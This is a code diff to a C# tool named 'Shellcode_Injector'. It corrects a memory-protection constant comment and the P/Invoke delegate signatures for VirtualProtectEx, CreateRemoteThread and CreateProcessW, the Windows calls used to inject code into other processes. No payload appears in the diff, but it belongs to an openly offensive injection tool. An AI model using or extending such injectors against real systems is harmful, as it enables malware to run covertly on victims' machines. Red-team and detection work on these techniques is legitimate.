@@ -13,7 +13,7 @@ namespace Shellcode_Injector
         //enums to hold static values
         public enum mem : uint
         {
-            rwx = 0x40,        //
+            rwx = 0x40,        //PAGE_EXECUTE_READWRITE
             rw = 0x04,         //PAGE_READ_WRITE
             rx = 0x20,         //PAGE_READ_EXECUTE
             cmt_rv = 0x3000,   //MEM_COMMIT_RESERVE
@@ -125,7 +125,7 @@ namespace Shellcode_Injector
         public delegate bool WPM(IntPtr hproc, IntPtr addr, byte[] buf, uint size, out int bwrite);
 
         //VirtualProtectEx - hProcess, lpAddress, dwSize, flAllocationType, flProtect
-        public delegate bool VPE(IntPtr hproc, IntPtr addr, int size, uint aloc, uint prot);
+        public delegate bool VPE(IntPtr hproc, IntPtr addr, int size, uint aloc, out uint prot);
 
         //CreateRemoteThread - hProcess, sec_attrs, size, startHere, params, zero, id
         public delegate IntPtr CRT(IntPtr hproc, IntPtr satt, uint size, IntPtr strt, IntPtr pms, uint zero, IntPtr ID);
@@ -143,8 +143,8 @@ namespace Shellcode_Injector
         // ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
         //    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation
         public delegate bool CPW(
-            [MarshalAs(UnmanagedType.LPWStr)] string app, 
-            string cmd, 
+            [MarshalAs(UnmanagedType.LPWStr)] string app,
+            [MarshalAs(UnmanagedType.LPWStr)] string cmd, 
             ref SATTR proc_attr,
             ref SATTR thread_attr, 
             bool inh_hand, 
